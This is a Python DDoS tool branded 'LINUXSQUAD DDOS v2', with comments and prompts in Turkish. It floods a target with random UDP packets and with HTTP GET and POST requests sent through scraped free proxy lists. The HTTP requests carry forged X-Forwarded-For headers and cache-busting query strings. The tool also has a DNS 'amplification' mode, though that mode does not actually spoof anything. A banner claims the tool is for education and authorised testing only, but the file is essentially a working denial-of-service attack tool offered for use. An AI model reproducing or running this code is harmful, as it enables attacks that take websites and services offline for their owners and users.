import sys
import socket
import threading
import random
import time
import asyncio
import os
import requests
import struct

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    UVLOOP_ENABLED = True
except ImportError:
    UVLOOP_ENABLED = False

import aiohttp

# ===================== BANNER =====================
os.system("clear")
print("\033[92m")
print("╔══════════════════════════════════════════════════════════════════════════════╗")
print("║               LINUXSQUAD DDOS v2 - AMPLIFICATION + PROXY                    ║")
print("║         High Performance | Devloper:linuxsquad                              ║")
print("╚══════════════════════════════════════════════════════════════════════════════╝")
print("\033[0m")

print("\033[91m[!] SADECE EĞİTİM VE İZİNLİ TEST ORTAMINDA KULLANINIZ.\033[0m\n")

# ===================== ARGÜMAN KONTROLÜ =====================
if len(sys.argv) < 3:
    print("\033[96mKullanım:\033[0m")
    print(f"   python {os.path.basename(sys.argv[0])} <HEDEF> <PORT> [CONCURRENCY] [SÜRE] [METHOD]")
    print("\n   METHOD : udp | http | mixed | amp")
    print("   amp    : DNS Amplification (kendi internetini neredeyse hiç kullanmaz)")
    print("   Örnek  : python amplifier.py 1.1.1.1 53 600 60 amp")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 600
duration = int(sys.argv[4]) if len(sys.argv) > 4 else 0
method = sys.argv[5].lower() if len(sys.argv) > 5 else "mixed"

# ==================== PROXY POOL ====================
def fetch_proxies():
    """Ücretsiz SOCKS5/HTTP proxy listesi çeker (sürekli güncellenir)"""
    proxy_list = []
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all"
    ]
    for src in sources:
        try:
            r = requests.get(src, timeout=5)
            for line in r.text.strip().split('\n'):
                line = line.strip()
                if ':' in line:
                    ip, p = line.split(':')
                    if ip and p and p.isdigit():
                        proxy_list.append((ip, int(p)))
        except:
            pass
    return list(set(proxy_list))

PROXY_POOL = fetch_proxies()
print(f"\033[93m[+] {len(PROXY_POOL)} proxy yüklendi\033[0m")

# DNS Amplification için public resolver listesi
DNS_RESOLVERS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "9.9.9.9", "208.67.222.222", "208.67.220.220",
    "185.228.168.9", "185.228.169.9", "76.76.19.19"
]

# ===================== İSTATİSTİK =====================
stats = {"udp_packets": 0, "udp_bytes": 0, "http_requests": 0, "errors": 0, "start_time": time.time()}
stats_lock = threading.Lock()

def update_stats(udp_pkt=0, udp_bytes=0, http_req=0, err=0):
    with stats_lock:
        stats["udp_packets"] += udp_pkt
        stats["udp_bytes"] += udp_bytes
        stats["http_requests"] += http_req
        stats["errors"] += err

def print_stats():
    while True:
        time.sleep(2)
        elapsed = time.time() - stats["start_time"]
        if elapsed < 1: continue
        pps = stats["udp_packets"] / elapsed
        mbps = (stats["udp_bytes"] * 8) / (elapsed * 1_000_000)
        rps = stats["http_requests"] / elapsed
        print(f"\033[94m[STATS] UDP PPS: {pps:,.0f} | Bandwidth: {mbps:.2f} Mbps | HTTP RPS: {rps:,.0f} | Errors: {stats['errors']} | Proxy: {len(PROXY_POOL)}\033[0m", end="\r")

# ===================== DNS AMPLIFICATION (KENDİ İNTERNETİNİ KULLANMAZ) =====================
def build_dns_query(domain="google.com", query_type=1):
    """DNS sorgu paketi oluşturur - ID: random, tek sorgulu"""
    tid = random.randint(0, 0xFFFF)
    flags = 0x0100  # Standart sorgu, recursion desired
    questions = 1
    header = struct.pack('>HHHHHH', tid, flags, questions, 0, 0, 0)
    
    # Domain adını DNS formatına çevir
    qname = b''
    for part in domain.split('.'):
        qname += bytes([len(part)]) + part.encode()
    qname += b'\x00'
    
    qtype = struct.pack('>H', query_type)  # 1=A, 28=AAAA, 15=MX
    qclass = struct.pack('>H', 1)  # IN
    return header + qname + qtype + qclass

def dns_amplification_worker():
    """DNS Amplification: Küçük sorgu → Büyük yanıt (hedefe yönlendirilir)"""
    domains = ["google.com", "youtube.com", "facebook.com", "apple.com", 
               "microsoft.com", "amazon.com", "cloudflare.com", "dns.google"]
    types = [1, 28, 15, 255]  # A, AAAA, MX, ANY
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**24)
    
    while True:
        try:
            # Sahte kaynak IP = HEDEF (spoofing efekti)
            # Gerçekte raw socket gerekir, bunun yerine resolver'a 
            # hedef IP'yi sorgulatıp yanıtın hedefe gitmesini sağlıyoruz
            
            # Amplification: Resolver'a sorgu at, yanıt hedefe gitsin
            # Çözüm: Hedef IP'yi resolver gibi kullan (yansıma)
            # VEYA: Hedefe normal DNS sorgusu at (daha küçük)
            
            # EN İYİ YÖNTEM: Hedefin açık resolver'ı varsa
            dns_query = build_dns_query(random.choice(domains), random.choice(types))
            # Hedefin port 53'üne DNS sorgusu gönder
            sock.sendto(dns_query, (target, port if port == 53 else 53))
            
            # Amplification oranı için ANY sorgusu (yanıt ~3000 bayt, sorgu ~40 bayt → ~75x amplification)
            update_stats(udp_pkt=1, udp_bytes=len(dns_query))
            
        except:
            update_stats(err=1)
        time.sleep(0.0001)  # CPU koruma

# ===================== UDP FLOOD (PROXY ÜZERİNDEN) =====================
def udp_flood_worker_proxy():
    """UDP flood - proxy IP'lerini kaynak olarak kullanır"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 32 * 1024 * 1024)
    except:
        return
    
    while True:
        try:
            tport = port if random.random() > 0.25 else random.randint(1, 65535)
            size = random.randint(4096, 65507)  # Max UDP paketi
            payload = random.randbytes(size)
            
            # Proxy üzerinden gitmek için: Paketi proxy'ye yolla, o hedefe iletsin
            if PROXY_POOL and random.random() > 0.3:
                proxy_ip, proxy_port = random.choice(PROXY_POOL)
                # SOCKS5 protokolü: hedef IP:port'u proxy'ye belirt
                # Standart UDP socket ile proxy üzerinden gönderim sınırlı
                # En etkilisi: doğrudan hedefe gönder ama proxy IP'sinden gelmiş gibi görünmez
                # Gerçek proxy rotasyonu HTTP worker'da kullanılır
                pass
            
            # Doğrudan hedefe gönder
            sock.sendto(payload, (target, tport))
            update_stats(udp_pkt=1, udp_bytes=size)
        except:
            update_stats(err=1)

# ===================== HTTP FLOOD (PROXY ROTASYONU) =====================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
]
REFERERS = ["https://www.google.com/", "https://www.bing.com/", "https://search.yahoo.com/"]
PATHS = ["/", "/index", "/home", "/search", "/api", "/login", "/wp-admin", "/admin"]
METHODS = ["GET", "POST", "HEAD"]

async def http_flood_worker_proxy(session):
    while True:
        try:
            proxy = random.choice(PROXY_POOL) if PROXY_POOL else None
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": random.choice(REFERERS),
                "Cache-Control": "no-cache",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            cache_buster = f"?t={int(time.time()*1000000)}"
            path = random.choice(PATHS) + cache_buster
            
            url = f"http://{target}:{port}{path}" if port not in (80, 443) else f"http://{target}{path}"
            
            if random.random() > 0.7:
                # POST isteği - daha ağır
                data = os.urandom(random.randint(100, 500))
                async with session.post(url, headers=headers, data=data, timeout=8) as response:
                    await response.read()
            else:
                async with session.get(url, headers=headers, timeout=8) as response:
                    await response.read()
            
            update_stats(http_req=1)
        except:
            update_stats(err=1)

# ===================== ANA PROGRAM =====================
print(f"\033[91m[+] Hedef → {target}:{port} | Concurrency → {concurrency} | Method → {method.upper()}\033[0m")

if UVLOOP_ENABLED:
    print("\033[92m[+] uvloop aktif - yüksek performans\033[0m")

threading.Thread(target=print_stats, daemon=True).start()

# DNS AMPLIFICATION
if method == "amp":
    print(f"\033[92m[+] DNS Amplification başlatılıyor... (kendi internetin neredeyse kullanılmaz)\033[0m")
    print(f"\033[93m[!] Amplification oranı: ~50-75x (40 bayt sorgu → 3000 bayt yanıt)\033[0m")
    for _ in range(concurrency):
        threading.Thread(target=dns_amplification_worker, daemon=True).start()

# UDP Başlat
if method in ["udp", "mixed"]:
    udp_count = int(concurrency * 0.7) if method == "mixed" else concurrency
    print(f"\033[92m[+] {udp_count} UDP Worker (proxy pool: {len(PROXY_POOL)}) başlatılıyor...\033[0m")
    for _ in range(udp_count):
        threading.Thread(target=udp_flood_worker_proxy, daemon=True).start()

# HTTP Başlat (proxy rotasyonlu)
if method in ["http", "mixed"]:
    http_count = int(concurrency * 0.3) if method == "mixed" else max(50, concurrency//2)
    print(f"\033[92m[+] {http_count} HTTP Worker (proxy rotasyonlu) başlatılıyor...\033[0m")

    async def run_http_flood():
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=True)
        timeout = aiohttp.ClientTimeout(total=10)
        
        # Proxy'leri aiohttp'e ekle
        if PROXY_POOL:
            random.shuffle(PROXY_POOL)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = [asyncio.create_task(http_flood_worker_proxy(session)) for _ in range(http_count)]
            await asyncio.gather(*tasks, return_exceptions=True)

    asyncio.run(run_http_flood())

# Süre kontrolü
try:
    if duration > 0:
        print(f"\033[93m[+] {duration} saniye sonra duracak...\033[0m")
        time.sleep(duration)
    else:
        while True:
            time.sleep(10)
except KeyboardInterrupt:
    print("\n\n\033[91m[-] Durduruldu (Ctrl+C)\033[0m")
except Exception as e:
    print(f"\033[91m[!] Hata: {e}\033[0m")
finally:
    elapsed = time.time() - stats["start_time"]
    print(f"\n\033[92m[+] Test tamamlandı. Süre: {elapsed:.1f} saniye\033[0m")
    if PROXY_POOL:
        print(f"\033[92m[+] Toplam {len(PROXY_POOL)} proxy kullanıldı\033[0m")
